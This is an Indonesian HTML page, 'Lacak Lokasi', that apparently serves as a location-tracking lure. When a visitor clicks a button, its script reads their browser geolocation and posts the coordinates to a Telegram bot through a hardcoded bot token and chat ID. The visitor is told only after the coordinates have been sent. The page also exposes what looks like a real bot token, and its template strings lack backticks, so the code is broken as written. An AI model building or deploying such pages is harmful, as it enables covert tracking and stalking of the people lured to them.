<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lacak Lokasi</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #000; color: #0F0; }
        h1, p, button { text-align: center; }
        #location { margin-top: 20px; text-align: center; }
        #popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #000; color: #0F0; padding: 20px; border: 2px solid #0F0; display: none; }
        #terminal { width: 80%; margin: 0 auto; border: 2px solid #0F0; padding: 20px; background-color: #000; color: #0F0; font-size: 14px; }
        #terminal p { margin: 10px 0; }
    </style>
</head>
<body>
    <div id="terminal">
        <h1>Lacak Lokasi</h1>
        <p>Klik tombol di bawah untuk melihat lokasi Anda:</p>
        <button id="getLocation">Dapatkan Lokasi</button>
        <div id="location"></div>
    </div>

    <div id="popup">
        <p>Data lokasi berhasil dikirim ke Telegram bot!</p>
        <button onclick="document.getElementById('popup').style.display='none';">Tutup</button>
    </div>

    <script>
        document.getElementById('getLocation').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById('location').innerHTML = "Geolokasi tidak didukung oleh browser Anda.";
            }
        });

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            document.getElementById('location').innerHTML = Lokasi Anda: Latitude ${latitude}, Longitude ${longitude};

            // Kirim data ke Telegram bot
            const token = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI';
            const chatId = '1966317946';
            const message = Lokasi: Latitude ${latitude}, Longitude ${longitude};

            fetch(https://api.telegram.org/bot${token}/sendMessage, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                document.getElementById('popup').style.display = 'block';
            })
            .catch((error) => {
                console.error('Error:', error);
                document.getElementById('location').innerHTML = "Terjadi kesalahan saat mengirim data ke Telegram bot.";
            });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById('location').innerHTML = "Penggunaan lokasi ditolak.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById('location').innerHTML = "Informasi lokasi tidak tersedia.";
                    break;
                case error.TIMEOUT:
                    document.getElementById('location').innerHTML = "Waktu habis untuk mendapatkan lokasi.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById('location').innerHTML = "Terjadi kesalahan yang tidak diketahui.";
                    break;
            }
        }
    </script>
</body>
</html>
